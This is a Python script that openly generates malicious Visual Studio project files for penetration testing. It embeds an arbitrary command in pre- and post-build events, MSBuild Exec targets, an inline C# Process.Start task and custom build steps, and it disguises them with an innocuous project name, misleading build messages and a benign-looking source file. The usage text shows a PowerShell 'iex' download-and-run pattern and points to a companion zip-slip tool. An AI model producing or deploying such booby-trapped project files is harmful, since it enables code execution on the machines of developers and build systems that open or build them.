"""
Malicious .sln (Visual Studio Solution) Payload Generator

Attack Vector:
    Visual Studio .sln files can contain MSBuild pre/post-build events that
    execute arbitrary commands when the project is opened or built.
    Many desktop apps import .sln files or project archives.

Targets:
    - Applications that import Visual Studio solutions
    - Build systems that auto-build imported projects
    - Any app that processes .sln/.csproj/.vcxproj files

Usage:
    python -I sln_payload.py --output malicious.sln --cmd calc.exe
    python -I sln_payload.py --output malicious.sln --cmd "powershell -nop -c iex(...)"
    python -I sln_payload.py --output malicious_project/ --type csproj

Generates:
    - .sln with embedded pre-build events
    - .csproj with PreBuildEvent/PostBuildEvent commands
    - .vcxproj with custom build steps
"""

import argparse
import os
import uuid


def generate_sln(project_name: str, project_guid: str) -> str:
    sln_guid = str(uuid.uuid4()).upper()
    return f"""
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.0.31903.59
MinimumVisualStudioVersion = 10.0.40219.1
Project("{{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}}") = "{project_name}", "{project_name}\\{project_name}.csproj", "{{{project_guid}}}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Any CPU = Debug|Any CPU
		Release|Any CPU = Release|Any CPU
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{{{project_guid}}}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
		{{{project_guid}}}.Debug|Any CPU.Build.0 = Debug|Any CPU
	EndGlobalSection
EndGlobal
""".strip()


def generate_csproj_payload(cmd: str) -> str:
    return f"""<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Import Project="$(MSBuildExtensionsPath)\\$(MSBuildToolsVersion)\\Microsoft.Common.props"
          Condition="Exists('$(MSBuildExtensionsPath)\\$(MSBuildToolsVersion)\\Microsoft.Common.props')" />
  <PropertyGroup>
    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
    <OutputType>Library</OutputType>
    <RootNamespace>VAPTPayload</RootNamespace>
    <AssemblyName>VAPTPayload</AssemblyName>
    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
  </PropertyGroup>

  <!-- PAYLOAD: Pre-build event executes on project load/build -->
  <PropertyGroup>
    <PreBuildEvent>{cmd}</PreBuildEvent>
    <PostBuildEvent>{cmd}</PostBuildEvent>
  </PropertyGroup>

  <!-- PAYLOAD: MSBuild Target that runs on open (some IDEs) -->
  <Target Name="VAPTCheck" BeforeTargets="Build;Rebuild;Clean">
    <Exec Command="{cmd}" />
  </Target>

  <!-- PAYLOAD: UsingTask inline code execution -->
  <UsingTask TaskName="InlineExec" TaskFactory="CodeTaskFactory"
             AssemblyFile="$(MSBuildToolsPath)\\Microsoft.Build.Tasks.Core.dll">
    <ParameterGroup />
    <Task>
      <Code Type="Fragment" Language="cs">
        System.Diagnostics.Process.Start("{cmd}");
      </Code>
    </Task>
  </UsingTask>

  <Target Name="RunInlineExec" BeforeTargets="Build">
    <InlineExec />
  </Target>

  <ItemGroup>
    <Compile Include="Program.cs" />
  </ItemGroup>
  <Import Project="$(MSBuildToolsPath)\\Microsoft.CSharp.targets" />
</Project>"""


def generate_vcxproj_payload(cmd: str) -> str:
    return f"""<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <ProjectGuid>{{{str(uuid.uuid4()).upper()}}}</ProjectGuid>
    <RootNamespace>VAPTPayload</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>

  <!-- Pre/Post Build Events -->
  <ItemDefinitionGroup>
    <PreBuildEvent>
      <Command>{cmd}</Command>
      <Message>Checking dependencies...</Message>
    </PreBuildEvent>
    <PostBuildEvent>
      <Command>{cmd}</Command>
      <Message>Finalizing build...</Message>
    </PostBuildEvent>
    <CustomBuildStep>
      <Command>{cmd}</Command>
      <Message>Custom build step...</Message>
      <Outputs>$(IntDir)\\custom.log</Outputs>
    </CustomBuildStep>
  </ItemDefinitionGroup>

  <Import Project="$(VCTargetsPath)\\Microsoft.Cpp.targets" />
</Project>"""


def generate_program_cs() -> str:
    return """using System;
namespace VAPTPayload {
    class Program {
        static void Main(string[] args) {
            Console.WriteLine("VAPT Test Project");
        }
    }
}
"""


def main():
    parser = argparse.ArgumentParser(description="Malicious .sln/.csproj generator for VAPT")
    parser.add_argument("--output", "-o", default="malicious_project",
                        help="Output directory or file")
    parser.add_argument("--cmd", default="calc.exe",
                        help="Command to execute (default: calc.exe)")
    parser.add_argument("--type", choices=["sln", "csproj", "vcxproj", "all"], default="all",
                        help="Project type to generate")
    parser.add_argument("--name", default="HelpLibrary",
                        help="Project name (innocuous-looking)")
    args = parser.parse_args()

    project_guid = str(uuid.uuid4()).upper()
    outdir = args.output

    os.makedirs(outdir, exist_ok=True)
    project_dir = os.path.join(outdir, args.name)
    os.makedirs(project_dir, exist_ok=True)

    if args.type in ("sln", "all"):
        sln_path = os.path.join(outdir, f"{args.name}.sln")
        with open(sln_path, "w") as f:
            f.write(generate_sln(args.name, project_guid))
        print(f"[+] Generated: {sln_path}")

    if args.type in ("csproj", "all"):
        csproj_path = os.path.join(project_dir, f"{args.name}.csproj")
        with open(csproj_path, "w") as f:
            f.write(generate_csproj_payload(args.cmd))
        print(f"[+] Generated: {csproj_path}")

    if args.type in ("vcxproj", "all"):
        vcxproj_path = os.path.join(project_dir, f"{args.name}.vcxproj")
        with open(vcxproj_path, "w") as f:
            f.write(generate_vcxproj_payload(args.cmd))
        print(f"[+] Generated: {vcxproj_path}")

    # Always generate a benign-looking source file
    cs_path = os.path.join(project_dir, "Program.cs")
    with open(cs_path, "w") as f:
        f.write(generate_program_cs())
    print(f"[+] Generated: {cs_path}")

    print(f"\n[*] Payload command: {args.cmd}")
    print(f"[*] To zip: python -I zip_slip.py --input {outdir} --output {args.name}.zip")


if __name__ == "__main__":
    main()
